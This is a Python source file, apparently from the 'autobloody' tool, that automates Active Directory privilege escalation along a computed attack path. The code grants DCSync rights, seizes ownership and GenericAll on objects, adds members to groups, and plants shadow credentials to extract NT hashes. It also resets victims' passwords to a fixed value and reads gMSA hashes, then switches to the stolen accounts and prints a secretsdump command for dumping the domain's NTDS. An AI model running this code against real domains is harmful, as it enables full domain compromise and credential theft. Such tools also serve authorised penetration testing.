from bloodyAD import ConnectionHandler
from bloodyAD.cli_modules import add, set, remove, get
from bloodyAD.exceptions import LOG
from badldap.commons.exceptions import LDAPModifyException
import logging, re, copy
# Constant for password changes
PASSWORD_DEFAULT = "AutoBl00dy123!"

class Automation:
    def __init__(self, args, path):
        self.co_args = args
        self.path = path
        self.rel_types = {
            0: self._nextHop,
            1: self._dcSync,
            2: self._setDCSync,
            3: self._ownerDomain,
            10: self._readGMSAPassword,
            100: self._addMember,
            200: self._aclGroup,
            300: self._ownerGroup,
            400: self._genericAll,
            500: self._genericAll,
            600: self._ownerContainer,
            10000: self._genericAll,
            11000: self._genericAll,
            12000: self._ownerContainer,
            100000: self._shadowCredentialsOrForceChange,
            100001: self._aclPrincipal,
            100002: self._ownerPrincipal,
            110000: self._forceChangePassword,
        }
        self.dirty_laundry = []

    async def simulate(self):
        self.simulation = True
        self.rel_str = {
            "setDCSync": "[Add DCSync right] to {}",
            "groupMember": "[Membership] on group {} for {}",
            "genericAll": "[GenericAll given] on {} to {}",
            "owner": "[Ownership Given] on {} to {}",
            "password": "[Change password] of {} to {}",
            "readGMSAPassword": "[Read GMSA Password] from {}",
            "shadowCredentials": "[Add Shadow Credentials] (if fails, fallback to password change) to {}",
        }
        print(f"\nAuthenticated as {self.co_args.username}:\n")
        await self._unfold()

    async def exploit(self):
        self.simulation = False
        # Add missing attributes for bloodyAD 2.x compatibility
        if not hasattr(self.co_args, 'gc'):
            self.co_args.gc = False
        if not hasattr(self.co_args, 'dc_ip'):
            self.co_args.dc_ip = ""
        if not hasattr(self.co_args, 'format'):
            self.co_args.format = ""
        if not hasattr(self.co_args, 'dns'):
            self.co_args.dns = ""
        if not hasattr(self.co_args, 'timeout'):
            self.co_args.timeout = 0
        # Convert kerberos boolean to krb_args list format expected by bloodyAD 2.x
        # Empty list means kerberos is enabled, None means disabled
        if hasattr(self.co_args, 'kerberos') and self.co_args.kerberos:
            self.co_args.kerberos = []
        else:
            self.co_args.kerberos = None
        # Convert secure boolean to integer format expected by bloodyAD 2.x
        if hasattr(self.co_args, 'secure') and self.co_args.secure:
            self.co_args.secure = 1
        else:
            self.co_args.secure = 0
            
        self.conn = ConnectionHandler(self.co_args)
        await self._unfold()

    async def _unfold(self):
        for rel in self.path:
            if not self.simulation:
                print()
            typeID = rel["cost"]
            try:
                await self.rel_types[typeID](rel)
            except Exception as e:
                await self._washer()
                # Quick fix for issue #5 remove it when dropping Neo4j dependency
                if typeID == 9999999999:
                    raise ValueError("The path you're trying to exploit is not exploitable by autobloody only, you may need other tools to exploit it. See #Limitations in the README")
                raise e

    async def _washer(self):
        if self.simulation:
            print()
        self.dirty_laundry.reverse()
        for laundry in self.dirty_laundry:
            if self.simulation:
                self._printOperation(laundry["f"].__name__, laundry["args"], True)
            else:
                await laundry["f"](self.conn, *laundry["args"])
        self.dirty_laundry = []

    async def _switchUser(self, user, pwd, dom=None):
        await self._washer()
        if self.simulation:
            print(f"\nAuthenticated as {user}:\n")
        else:
            # Close current connection
            await self.conn.closeLdap()
            
            # Create new args for the new user
            new_args = copy.copy(self.co_args)
            new_args.username = user
            new_args.password = pwd
            if dom:
                new_args.domain = dom
            
            # Clear old credentials to avoid mixing credential types
            new_args.certificate = None
            new_args.kerberos = None
            
            # Create new ConnectionHandler with new credentials
            self.conn = ConnectionHandler(new_args)

    async def _nextHop(self, rel):
        return

    async def _dcSync(self, rel):
        if not self.simulation:
            print(
                "[+] You can now dump the NTDS using: secretsdump.py"
                f" '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'"
            )

    async def _setDCSync(self, rel):
        operation = add.setDCSync
        if self.simulation:
            user = rel["start_node"]["name"]
            self._printOperation(operation.__name__, [user])
        else:
            user = rel["start_node"]["distinguishedname"]
            await operation(self.conn, user)

    async def _ownerDomain(self, rel):
        await self._setOwner(rel)
        await self._setDCSync(rel)

    async def _addMember(self, rel):
        add_operation = add.groupMember
        member = rel["start_node"]["name"]
        group = rel["end_node"]["name"]
        if self.simulation:
            self._printOperation(add_operation.__name__, [group, member])
        else:
            member_sid = rel["start_node"]["objectid"]
            group_dn = rel["end_node"]["distinguishedname"]
            try:
                await add_operation(self.conn, group_dn, member_sid)
                # Close connection to apply changes
                await self.conn.closeLdap()
                self.dirty_laundry.append({"f": remove.groupMember, "args": [group_dn, member_sid]})
            except LDAPModifyException as e:
                # Check if it's an entryAlreadyExists error
                if e.resultcode == 68:
                    LOG.warning(f"{member} already in {group}, continuing exploitation...")
                else:
                    raise e

    async def _aclGroup(self, rel):
        await self._genericAll(rel)
        await self._addMember(rel)

    async def _ownerGroup(self, rel):
        await self._setOwner(rel)
        await self._aclGroup(rel)

    async def _aclPrincipal(self, rel):
        await self._genericAll(rel)
        await self._shadowCredentialsOrForceChange(rel)

    async def _ownerPrincipal(self, rel):
        await self._setOwner(rel)
        await self._aclPrincipal(rel)

    async def _ownerContainer(self, rel):
        await self._setOwner(rel)
        await self._genericAll(rel)

    async def _shadowCredentialsOrForceChange(self, rel):
        """
        Try to use shadowCredentials first, fall back to forceChangePassword if not possible
        """
        shadow_operation = add.shadowCredentials
        if self.simulation:
            target = rel["end_node"]["name"]
            self._printOperation(shadow_operation.__name__, [target])
        else:
            target = rel["end_node"]["samaccountname"]
            target_dn = rel["end_node"]["distinguishedname"]
                
            # Try shadowCredentials
            LOG.debug("Attempting shadowCredentials attack")
            try:
                key_matches, result = await extractFromLogs(r'key: (\S+)', shadow_operation, self.conn, target_dn)
                # Retrieve all the groups of the first key match from logged output
                key_groups = key_matches[0].groups() if key_matches else None
                key = None
                # If we have key groups, extract the key
                if key_groups:
                    key = key_groups[0]
                else:
                    LOG.warning("Could not extract key from shadowCredentials logs, key won't be removed after exploit")

                pwd = ":" + result[0]['NT']
                print(f"Successfully obtained NT hash of {target} via shadowCredentials: {result[0]['NT']}")
                # Pass NT hash in the format ":nt_hash" for NTLM authentication
                LOG.info(f"Switching to user: {target}")
                self.dirty_laundry.append({"f": remove.shadowCredentials, "args": [target_dn, key]})
                await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
            except Exception as e:
                # If shadowCredentials fails, fall back to forceChangePassword
                LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
                await self._forceChangePassword(rel)

    # ForceChangePassword edge directly changes the password
    async def _forceChangePassword(self, rel):
        pwd = PASSWORD_DEFAULT
        pwd_operation = set.password
        if self.simulation:
            user = rel["end_node"]["name"]
            self._printOperation(pwd_operation.__name__, [user, pwd])
        else:
            user_dn = rel["end_node"]["distinguishedname"]
            await pwd_operation(self.conn, user_dn, pwd)
            user = rel["end_node"]["samaccountname"]
            LOG.info(f"switching to LDAP connection for user {user}")
        await self._switchUser(user, pwd, dom=rel["end_node"]["domain"])

    async def _genericAll(self, rel):
        add_operation = add.genericAll
        if self.simulation:
            user = rel["start_node"]["name"]
            target = rel["end_node"]["name"]
            self._printOperation(add_operation.__name__, [target, user])
        else:
            user = rel["start_node"]["distinguishedname"]
            target = rel["end_node"]["distinguishedname"]
            await add_operation(self.conn, target, user)
            self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})

    async def _setOwner(self, rel):
        operation = set.owner
        if self.simulation:
            user = rel["start_node"]["name"]
            target = rel["end_node"]["name"]
            self._printOperation(operation.__name__, [target, user])
        else:
            user = rel["start_node"]["distinguishedname"]
            target = rel["end_node"]["distinguishedname"]
            await operation(self.conn, target, user)

    async def _readGMSAPassword(self, rel):
        """Exploit ReadGMSAPassword edge to retrieve GMSA password"""
        if self.simulation:    
            target = rel["end_node"]["name"]      
            self._printOperation("readGMSAPassword", [target])
        else:
            target = rel["end_node"]["samaccountname"]
            target_dn = rel["end_node"]["distinguishedname"]
            
            # Read msDS-ManagedPassword attribute from the GMSA account
            # This returns a list with one dictionary like [{'NT': 'hash', 'B64ENCODED': 'base64string'}]
            nthash = None
            async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                if "msDS-ManagedPassword" in entry:
                    nthash = entry["msDS-ManagedPassword"][0]['NT']
                    break
                
            if nthash:
                print(f"From {target}, retrieved GMSA NT hash: {nthash}")  
                # Pass NT hash in the format ":nt_hash" for NTLM authentication
                pwd = ":"+nthash
                LOG.info(f"Switching to GMSA account: {target}")
                await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
            else:
                raise ValueError("Failed to retrieve GMSA password")


    def _printOperation(self, operation_name, operation_args, revert=False):
        operation_str = "\t"
        if revert:
            operation_str += "[-] Revert "
        else:
            operation_str += "[+] "

        operation_str += self.rel_str[operation_name]
        arg_nb = operation_str.count("{")
        print(operation_str.format(*operation_args[:arg_nb]))



# Utilities
class Grabber(logging.Handler):
        def __init__(self, pattern):
            super().__init__()
            self.matches = []
            self.pattern = pattern

        def emit(self, record: logging.LogRecord):
            msg = record.getMessage()
            m = re.search(self.pattern, msg)
            if m:
                self.matches.append(m)

async def extractFromLogs(pattern, function, *args, **kwargs):
    logger = logging.getLogger('bloodyAD')
    logger.setLevel(logging.INFO)
    grabber = Grabber(pattern)
    logger.addHandler(grabber)
    try:
        results = await function(*args, **kwargs)
    finally:
        logger.removeHandler(grabber)
    return (grabber.matches, results)